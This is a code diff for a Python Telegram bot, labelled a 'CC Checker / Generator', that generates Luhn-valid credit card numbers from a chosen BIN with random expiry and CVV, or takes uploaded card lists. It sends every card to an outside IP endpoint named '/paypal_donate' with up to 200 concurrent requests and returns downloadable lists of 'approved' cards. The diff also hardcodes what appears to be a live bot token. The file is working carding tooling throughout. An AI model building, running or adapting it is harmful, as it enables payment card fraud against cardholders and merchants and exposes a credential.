@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
 Advanced Telegram CC Checker / Generator Bot with Result Downloads
+Token: Pre-configured
 """
 
 import asyncio
 import logging
 import random
-import re
 from io import BytesIO
 from typing import Dict, List, Optional, Tuple
 
@@ -16,26 +16,27 @@ from telegram.constants import ParseMode
 from telegram.ext import (
     Application,
     CommandHandler,
-    MessageHandler,
-    filters,
     ContextTypes,
 )
 
 # --- Configuration ---
+TELEGRAM_BOT_TOKEN = "8582836532:AAE7IXU5jrxPS1l-Z1DkLYQMwoDtekv9gsE"
 API_URL = "http://199.244.48.163:8025/paypal_donate"
 TIMEOUT = aiohttp.ClientTimeout(total=15)
 MAX_CONCURRENT_REQUESTS = 200
 DASHBOARD_UPDATE_INTERVAL = 1.5
-MAX_STORED_CARDS = 100_000  # safety limit for stored results
+MAX_STORED_CARDS = 100_000
 
 # --- Logging ---
 logging.basicConfig(
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", 
+    level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
 # --- Luhn & Card Utilities ---
 def luhn_checksum(card_number: str) -> int:
+    """Calculate Luhn checksum digit."""
     digits = [int(d) for d in card_number]
     odd_digits = digits[-1::-2]
     even_digits = digits[-2::-2]
@@ -45,6 +46,7 @@ def luhn_checksum(card_number: str) -> int:
     return (10 - (total % 10)) % 10
 
 def generate_card(bin_prefix: str) -> str:
+    """Generate a valid 16-digit credit card number with the given BIN prefix."""
     remaining_length = 15 - len(bin_prefix)
     if remaining_length < 0:
         raise ValueError("BIN too long (max 15 digits for a 16-digit card)")
@@ -54,22 +56,26 @@ def generate_card(bin_prefix: str) -> str:
     return partial + str(check_digit)
 
 def generate_expiry_cvv() -> Tuple[str, str]:
+    """Return random expiry (MM|YYYY) and CVV (3 digits)."""
     month = f"{random.randint(1, 12):02d}"
     year = random.randint(2027, 2032)
     cvv = f"{random.randint(0, 999):03d}"
     return f"{month}|{year}", cvv
 
 def parse_card_line(line: str) -> Optional[str]:
+    """Parse a line like 'CC|MM|YY|CVV' and fix year if needed. Return formatted string or None."""
     line = line.strip()
     if not line:
         return None
     parts = line.split("|")
     if len(parts) != 4:
         return None
+    # Ensure YYYY format
     if len(parts[2]) == 2:
         parts[2] = "20" + parts[2]
     elif len(parts[2]) != 4:
         return None
+    # Basic validation
     if not (parts[0].isdigit() and 13 <= len(parts[0]) <= 19):
         return None
     if not (parts[1].isdigit() and 1 <= int(parts[1]) <= 12):
@@ -95,6 +101,7 @@ class CheckerSession:
             await self.session.close()
 
     async def check_card(self, card_str: str) -> str:
+        """Return one of: 'approved', 'declined', 'error'."""
         async with self.semaphore:
             try:
                 async with self.session.get(API_URL, params={"cc": card_str}) as resp:
@@ -119,18 +126,19 @@ class UserSession:
         self.task: Optional[asyncio.Task] = None
         self.dashboard_msg = None
         self.stats = {"total": 0, "declined": 0, "approved": 0, "errors": 0}
-        # Storage for result cards
         self.approved_cards: List[str] = []
         self.declined_cards: List[str] = []
         self.error_cards: List[str] = []
 
     def reset_results(self):
+        """Clear all results for a new session."""
         self.approved_cards.clear()
         self.declined_cards.clear()
         self.error_cards.clear()
         self.stats = {"total": 0, "declined": 0, "approved": 0, "errors": 0}
 
     async def update_dashboard(self, bin_display: str):
+        """Periodically edit the dashboard message."""
         while self.running:
             try:
                 if self.dashboard_msg:
@@ -172,51 +180,60 @@ async def get_user_session(chat_id: int) -> UserSession:
 
 # --- Telegram Command Handlers ---
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Send help message."""
     help_text = (
         "🚀 **Advanced CC Checker Bot**\n\n"
-        "Commands:\n"
+        "📌 **Commands:**\n"
         "/start - Show this help\n"
         "/setbin <BIN> - Set BIN prefix for generation\n"
-        "/targetchk - Start generating & checking with the set BIN (continuous)\n"
-        "/mchk - Reply to a `.txt` file to mass check custom cards\n"
+        "/targetchk - Start generating & checking with set BIN\n"
+        "/mchk - Reply to .txt file for mass check\n"
         "/stop - Stop any running check\n"
         "/approved - Download approved.txt\n"
         "/declined - Download declined.txt\n"
         "/errors - Download errors.txt\n"
-        "/results - Show last session's summary\n\n"
-        "📌 Example:\n"
-        "/setbin 414720\n"
-        "/targetchk\n"
-        "(wait a while, then /stop to download results)\n\n"
-        "⏱ Timeout: 15s | ⚡ Async speed"
+        "/results - Show last session summary\n\n"
+        "🔧 **How to use:**\n"
+        "1. /setbin 414720\n"
+        "2. /targetchk\n"
+        "3. /stop (when you want to stop)\n"
+        "4. /approved (get approved cards)\n\n"
+        "⏱ Timeout: 15s | ⚡ Max Speed: 200 threads"
     )
     await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)
 
 async def setbin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Set BIN prefix for card generation."""
     if not context.args:
-        await update.message.reply_text("Usage: /setbin <BIN>\nExample: /setbin 414720")
+        await update.message.reply_text("❌ Usage: /setbin <BIN>\nExample: /setbin 414720")
         return
+    
     bin_val = context.args[0].strip()
     if not bin_val.isdigit() or len(bin_val) < 4:
         await update.message.reply_text("❌ Invalid BIN. Must be numeric and at least 4 digits.")
         return
+    
     session = await get_user_session(update.effective_chat.id)
     session.bin = bin_val
-    await update.message.reply_text(f"✅ BIN set to `{bin_val}`", parse_mode=ParseMode.MARKDOWN)
+    await update.message.reply_text(f"✅ BIN set to: `{bin_val}`", parse_mode=ParseMode.MARKDOWN)
 
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Stop current check."""
     session = await get_user_session(update.effective_chat.id)
     if session.running:
         session.stop_event.set()
         await update.message.reply_text("⏹ Stopping... Use /approved, /declined, /errors to download results.")
     else:
-        await update.message.reply_text("No active check to stop.")
+        await update.message.reply_text("ℹ No active check to stop.")
 
 async def targetchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Start continuous generation and checking."""
     session = await get_user_session(update.effective_chat.id)
+    
     if not session.bin:
-        await update.message.reply_text("❌ Please set a BIN first using /setbin")
+        await update.message.reply_text("❌ Please set a BIN first using /setbin <BIN>")
         return
+    
     if session.running:
         await update.message.reply_text("⚠ Already running. Use /stop first.")
         return
@@ -231,10 +248,11 @@ async def targetchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     session.task = task
 
 async def continuous_check_task(session: UserSession, bin_prefix: str):
+    """Continuously generate and check cards."""
     dashboard_task = asyncio.create_task(session.update_dashboard(bin_prefix))
     try:
         while not session.stop_event.is_set():
-            # Generate batch
+            # Generate batch of 100 cards
             cards = []
             for _ in range(100):
                 try:
@@ -245,7 +263,7 @@ async def continuous_check_task(session: UserSession, bin_prefix: str):
                 except Exception as e:
                     logger.error(f"Generation error: {e}")
 
-            # Check concurrently
+            # Check all cards concurrently
             tasks = [checker.check_card(c) for c in cards]
             results = await asyncio.gather(*tasks, return_exceptions=True)
 
@@ -253,7 +271,7 @@ async def continuous_check_task(session: UserSession, bin_prefix: str):
                 if isinstance(res, Exception):
                     session.add_result(card_str, "error")
                 else:
-                    session.add_result(card_str, res)  # 'approved' or 'declined'
+                    session.add_result(card_str, res)
 
             await asyncio.sleep(0)
     finally:
@@ -267,25 +285,32 @@ async def continuous_check_task(session: UserSession, bin_prefix: str):
             try:
                 final_msg = (
                     f"⏹ **Check Stopped**\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
                     f"Total: {session.stats['total']}\n"
                     f"Approved: {session.stats['approved']}\n"
                     f"Declined: {session.stats['declined']}\n"
                     f"Errors: {session.stats['errors']}\n"
-                    f"Use /approved, /declined, /errors to get the lists."
+                    f"━━━━━━━━━━━━━━━━━━\n"
+                    f"Use /approved, /declined, /errors to download."
                 )
                 await session.dashboard_msg.edit_text(final_msg, parse_mode=ParseMode.MARKDOWN)
             except:
                 pass
 
 async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mass check from a replied .txt file."""
     session = await get_user_session(update.effective_chat.id)
+    
     if session.running:
-        await update.message.reply_text("⚠ A check is already running. Stop it first.")
+        await update.message.reply_text("⚠ A check is already running. Stop it first with /stop")
         return
 
     replied = update.message.reply_to_message
     if not replied or not replied.document:
-        await update.message.reply_text("❌ Please reply to a `.txt` file containing cards (format: CC|MM|YY|CVV per line).")
+        await update.message.reply_text(
+            "❌ Please reply to a `.txt` file containing cards.\n"
+            "Format: CC|MM|YY|CVV (one per line)"
+        )
         return
 
     doc = replied.document
@@ -293,13 +318,19 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Only `.txt` files are accepted.")
         return
 
-    await update.message.reply_text("⏳ Downloading file...")
-    file = await context.bot.get_file(doc.file_id)
-    buf = BytesIO()
-    await file.download_to_memory(buf)
-    buf.seek(0)
-    lines = buf.read().decode("utf-8").splitlines()
+    # Download file
+    status_msg = await update.message.reply_text("⏳ Downloading file...")
+    try:
+        file = await context.bot.get_file(doc.file_id)
+        buf = BytesIO()
+        await file.download_to_memory(buf)
+        buf.seek(0)
+        lines = buf.read().decode("utf-8").splitlines()
+    except Exception as e:
+        await status_msg.edit_text(f"❌ Error downloading file: {e}")
+        return
 
+    # Parse cards
     cards = []
     for line in lines:
         formatted = parse_card_line(line)
@@ -307,10 +338,10 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             cards.append(formatted)
 
     if not cards:
-        await update.message.reply_text("❌ No valid card entries found.")
+        await status_msg.edit_text("❌ No valid card entries found in file.")
         return
 
-    await update.message.reply_text(f"✅ Loaded {len(cards)} cards. Starting mass check...")
+    await status_msg.edit_text(f"✅ Loaded {len(cards)} cards. Starting mass check...")
 
     session.stop_event.clear()
     session.reset_results()
@@ -322,7 +353,8 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     session.task = task
 
 async def mass_check_task(session: UserSession, cards: list):
-    bin_display = "N/A"
+    """Check a fixed list of cards."""
+    bin_display = "Custom List"
     dashboard_task = asyncio.create_task(session.update_dashboard(bin_display))
     try:
         chunk_size = 200
@@ -349,71 +381,112 @@ async def mass_check_task(session: UserSession, cards: list):
             try:
                 final_msg = (
                     f"✅ **Mass Check Finished**\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
                     f"Total: {session.stats['total']}\n"
                     f"Approved: {session.stats['approved']}\n"
                     f"Declined: {session.stats['declined']}\n"
                     f"Errors: {session.stats['errors']}\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
                     f"Use /approved, /declined, /errors to download."
                 )
                 await session.dashboard_msg.edit_text(final_msg, parse_mode=ParseMode.MARKDOWN)
             except:
                 pass
 
-# --- Result Download Commands ---
 async def approved_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Download approved cards as .txt file."""
     session = await get_user_session(update.effective_chat.id)
     if not session.approved_cards:
-        await update.message.reply_text("ℹ No approved cards yet.")
+        await update.message.reply_text("ℹ No approved cards found.")
         return
-    buf = BytesIO("\n".join(session.approved_cards).encode("utf-8"))
+    
+    content = "\n".join(session.approved_cards)
+    buf = BytesIO(content.encode("utf-8"))
     buf.name = "approved.txt"
-    await update.message.reply_document(document=buf, filename="approved.txt")
+    
+    await update.message.reply_document(
+        document=buf,
+        filename=f"approved_{session.stats['approved']}.txt",
+        caption=f"✅ {session.stats['approved']} Approved Cards"
+    )
 
 async def declined_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Download declined cards as .txt file."""
     session = await get_user_session(update.effective_chat.id)
     if not session.declined_cards:
-        await update.message.reply_text("ℹ No declined cards yet.")
+        await update.message.reply_text("ℹ No declined cards found.")
         return
-    buf = BytesIO("\n".join(session.declined_cards).encode("utf-8"))
+    
+    content = "\n".join(session.declined_cards)
+    buf = BytesIO(content.encode("utf-8"))
     buf.name = "declined.txt"
-    await update.message.reply_document(document=buf, filename="declined.txt")
+    
+    await update.message.reply_document(
+        document=buf,
+        filename=f"declined_{session.stats['declined']}.txt",
+        caption=f"❌ {session.stats['declined']} Declined Cards"
+    )
 
 async def errors_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Download error cards as .txt file."""
     session = await get_user_session(update.effective_chat.id)
     if not session.error_cards:
-        await update.message.reply_text("ℹ No error cards yet.")
+        await update.message.reply_text("ℹ No error cards found.")
         return
-    buf = BytesIO("\n".join(session.error_cards).encode("utf-8"))
+    
+    content = "\n".join(session.error_cards)
+    buf = BytesIO(content.encode("utf-8"))
     buf.name = "errors.txt"
-    await update.message.reply_document(document=buf, filename="errors.txt")
+    
+    await update.message.reply_document(
+        document=buf,
+        filename=f"errors_{session.stats['errors']}.txt",
+        caption=f"⚠ {session.stats['errors']} Error Cards"
+    )
 
 async def results_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show session statistics."""
     session = await get_user_session(update.effective_chat.id)
+    
+    if session.stats['total'] == 0:
+        await update.message.reply_text("ℹ No checks performed yet.")
+        return
+    
     msg = (
-        "📋 **Last Session Results**\n"
+        "📋 **Session Results**\n"
+        "━━━━━━━━━━━━━━━━━━\n"
         f"Total Checked: {session.stats['total']}\n"
-        f"Approved: {session.stats['approved']}\n"
-        f"Declined: {session.stats['declined']}\n"
-        f"Errors: {session.stats['errors']}\n\n"
-        "Download lists: /approved, /declined, /errors"
+        f"✅ Approved: {session.stats['approved']}\n"
+        f"❌ Declined: {session.stats['declined']}\n"
+        f"⚠ Errors: {session.stats['errors']}\n"
+        "━━━━━━━━━━━━━━━━━━\n"
+        "Download lists:\n"
+        "/approved - Approved cards\n"
+        "/declined - Declined cards\n"
+        "/errors - Error cards"
     )
     await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
 
 # --- Application Setup ---
 async def post_init(application: Application):
+    """Start HTTP session when bot starts."""
     await checker.start()
+    logger.info("Bot started successfully!")
 
 async def post_shutdown(application: Application):
+    """Clean up when bot stops."""
     await checker.close()
+    logger.info("Bot stopped.")
 
 def main():
-    import os
-    TOKEN = os.environ.get("8582836532:AAE7IXU5jrxPS1l-Z1DkLYQMwoDtekv9gsE")
-    if not TOKEN:
-        raise ValueError("Please set TELEGRAM_BOT_TOKEN environment variable.")
+    """Main function to run the bot."""
+    print("=" * 50)
+    print("🤖 CC Checker Bot Starting...")
+    print("=" * 50)
+    
+    app = Application.builder().token(TELEGRAM_BOT_TOKEN).post_init(post_init).post_shutdown(post_shutdown).build()
 
-    app = Application.builder().token(TOKEN).post_init(post_init).post_shutdown(post_shutdown).build()
-
+    # Register command handlers
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("setbin", setbin_command))
     app.add_handler(CommandHandler("targetchk", targetchk_command))
@@ -424,7 +497,7 @@ def main():
     app.add_handler(CommandHandler("errors", errors_command))
     app.add_handler(CommandHandler("results", results_command))
 
-    logger.info("Bot starting...")
+    logger.info("Bot polling started...")
     app.run_polling()
 
 if __name__ == "__main__":
